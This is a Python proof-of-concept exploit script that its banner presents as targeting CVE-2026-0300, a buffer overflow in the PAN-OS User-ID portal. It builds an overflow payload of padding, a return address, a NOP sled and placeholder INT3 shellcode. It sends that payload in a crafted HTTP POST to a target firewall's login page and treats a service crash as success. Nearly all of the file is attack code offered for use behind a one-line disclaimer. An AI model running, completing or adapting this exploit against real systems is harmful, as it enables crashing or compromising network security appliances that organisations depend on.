#!/usr/bin/env python3
import socket
import struct
import argparse
import sys
import time

# ANSI Escape Codes for Colors (Zero-Dependency)
R = "\033[31m"  # Red
G = "\033[32m"  # Green
Y = "\033[33m"  # Yellow
B = "\033[34m"  # Blue
C = "\033[36m"  # Cyan
W = "\033[0m"   # White/Reset

def print_banner():
    banner = f"""
{C}########################################################
#                                                      #
#   {R}CVE-2026-0300: PAN-OS User-ID Portal Research PoC{C}  #
#   {Y}CWE-787: Out-of-bounds Write (Buffer Overflow){C}    #
#                                                      #
########################################################{W}
    """
    print(banner)

def build_payload(offset, ret_addr):
    print(f"[{B}*{W}] Building research payload...")
    padding = b"A" * offset
    try:
        return_address = struct.pack("<Q", int(ret_addr, 16))
    except Exception:
        print(f"[{R}!{W}] Invalid Return Address format!")
        sys.exit(1)
        
    nop_sled = b"\x90" * 64
    shellcode = b"\xcc" * 128  # INT3 Breakpoint for Debugging
    return padding + return_address + nop_sled + shellcode

def send_exploit(target, port, payload):
    print(f"[{B}*{W}] Target: {G}{target}:{port}{W}")
    request = (
        b"POST /php/login.php HTTP/1.1\r\n"
        b"Host: " + target.encode() + b"\r\n"
        b"User-Agent: Mozilla/5.0 (Security Research Agent)\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: " + str(len(payload)).encode() + b"\r\n"
        b"Connection: close\r\n"
        b"\r\n" + payload
    )

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            print(f"[{Y}i{W}] Connecting to target...")
            s.connect((target, port))
            print(f"[{G}+{W}] Connection established! Sending buffer...")
            s.sendall(request)
            time.sleep(1)
            print(f"[{B}*{W}] Data delivered. Checking for service crash...")
            try:
                response = s.recv(1024)
                if not response:
                    print(f"[{R}!{W}] Service closed connection. {G}Potential Overflow Success!{W}")
                else:
                    print(f"[{Y}!{W}] Service responded. It might be patched or mitigated.")
            except socket.timeout:
                print(f"[{R}!{W}] Timeout! Service unresponsive. {G}Likely Crashed (Exploit Worked).{W}")
    except Exception as e:
        print(f"[{R}x{W}] Connection failed: {e}")

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="Professional PoC for CVE-2026-0300 Research")
    parser.add_argument("-t", "--target", required=True, help="IP address of the target firewall")
    parser.add_argument("-p", "--port", type=int, default=6082, help="Port (Default: 6082)")
    parser.add_argument("-o", "--offset", type=int, default=2048, help="Buffer offset")
    parser.add_argument("-r", "--ret", default="0xdeadbeef", help="Hex Return Address")
    args = parser.parse_args()

    print(f"{R}WARNING: THIS IS FOR AUTHORIZED EDUCATIONAL RESEARCH ONLY.{W}\n")
    payload = build_payload(args.offset, args.ret)
    send_exploit(args.target, args.port, payload)

if __name__ == "__main__":
    main()
